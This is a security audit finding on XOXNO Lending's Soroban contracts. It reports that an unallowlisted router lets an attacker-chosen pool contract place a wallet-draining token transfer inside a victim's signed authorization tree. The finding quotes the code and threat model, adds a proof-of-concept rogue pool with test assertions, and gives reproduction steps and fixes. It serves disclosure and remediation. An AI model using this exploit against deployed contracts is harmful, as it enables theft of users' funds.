### Title
Attacker-crafted `swap_xdr` route executes arbitrary contract code inside the caller's authorized call tree, draining the signer's wallet — ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
CVE-2023-29809's class — a crafted request payload that causes the application to execute attacker-supplied code — maps directly onto XOXNO Lending's router strategies. Every controller strategy that takes a `swap`/`swap_xdr` argument (`swap_collateral`, `multiply`, `swap_debt`, `repay_debt_with_collateral`) forwards caller-supplied route bytes to the configured router, which invokes every `pool` address named in the payload with no venue allowlist. A malicious "pool" contract runs inside the transaction below the signer's `require_auth`, and any `token.transfer(victim, attacker, x)` it issues is recorded by the host as a child of the signer's authorization entry — and executes if the signer signs the simulated tree (the normal flow). The loss is the victim's entire wallet of any token, not just the routed amount.

### Finding Description
`swap_tokens` authorizes exactly one input-token transfer to the router and then calls `router.execute_strategy(controller, amount_in, swap)` with fully caller-controlled route bytes [1](#0-0) . The router dispatches each hop to `env.invoke_contract` on the payload-named `pool` address for every venue (Aquarius `invoke_pool_swap`, Comet `swap_exact_amount_in`, etc.) and keeps no allowlist of pool or token addresses [2](#0-1) [3](#0-2) . The threat model states this plainly: "the router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization... The loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it" [4](#0-3) . The harness test `rogue_hop_pool_transfer_joins_caller_auth_tree.rs` proves end-to-end that a rogue hop pool's `token.transfer(alice, attacker, WALLET_BALANCE)` is recorded under Alice's `swap_collateral` auth entry and executes when that tree is signed, zeroing her wallet while the swap itself settles at a fair rate [5](#0-4) [6](#0-5) .

### Impact Explanation
Theft of user funds. Because `simulateTransaction` produces the exact auth tree the wallet signs, a victim served a poisoned route (compromised quote server, malicious frontend, phishing dapp using the public entrypoints) signs a tree containing `transfer(victim → attacker)` for any token they hold. The stolen amount is unbounded by the swap size, the route minimum, or the post-swap health-factor check — the controller only verifies `RouterOverspend`, `NoSwapOutput`, and final account risk on the routed assets [7](#0-6) . Any unprivileged address can submit the malicious payload; the victim only needs to sign the transaction a normal client produces.

### Likelihood Explanation
Routes are opaque XDR built off-chain, so a poisoned payload is indistinguishable to a non-decoding signer — the docs themselves had to ship `verifyRouteBytes` tooling and warn that clients "must decode the route it signs and refuse an authorization tree with any other child," confirming the risk is real and pushed onto integrators [8](#0-7) . Exploitation requires the victim to sign the poisoned tree, which caps likelihood below a unilateral drain, but every strategy entrypoint and direct `execute_strategy` call is exposed, and no on-chain mechanism prevents it. Medium-to-high likelihood, critical per-victim impact.

### Recommendation
Enforce a venue/pool allowlist on-chain (registry of approved pool addresses per venue, or validate pools against the DEX factory), and/or have the router verify that token addresses in a hop belong to the invoked pool (as `pool_tokens`/`assert_share_token` already do for Aquarius LP ops). Alternatively, execute hops under a scoped invoker-contract auth that cannot join the sender's auth tree, and make the controller reject any route whose execution adds children beyond the single authorized input transfer to the signer's auth entry.

### Proof of Concept
See `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`: `RogueHopPool.swap` issues `token::transfer(victim, attacker, amount)` when invoked as a route hop [5](#0-4) ; recording mode shows the transfer nested under the caller's `swap_collateral` entry [9](#0-8) ; and enforcing mode confirms the signed tree executes the drain (`wallet(alice) == 0`, `wallet(attacker) == WALLET_BALANCE`) [6](#0-5) . Reproduction: craft a `StrategySwap` whose `assets` registry names an attacker contract as the hop pool and the victim's unrelated wallet token for the theft; submit via `swap_collateral(caller, account_id, asset_in, amount, asset_out, route)`; the victim signs the simulated auth tree; the pool call transfers the victim's full wallet balance to the attacker while the swap returns a fair output and all controller checks pass.

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L41-54)
```rust
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/venues/aquarius/pool.rs (L25-35)
```rust
    authorize_token_transfer(env, token_in, router, pool, amount_in);
    let args: Vec<Val> = vec![
        env,
        router.into_val(env),
        in_idx.into_val(env),
        out_idx.into_val(env),
        to_u128(env, amount_in).into_val(env),
        0_u128.into_val(env),
    ];
    let _: u128 = env.invoke_contract(pool, &symbol_short!("swap"), args);
}
```

**File:** contracts/swap-aggregator/src/venues/comet.rs (L30-34)
```rust
    let _: (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "swap_exact_amount_in"),
        args,
    );
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-71)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-226)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
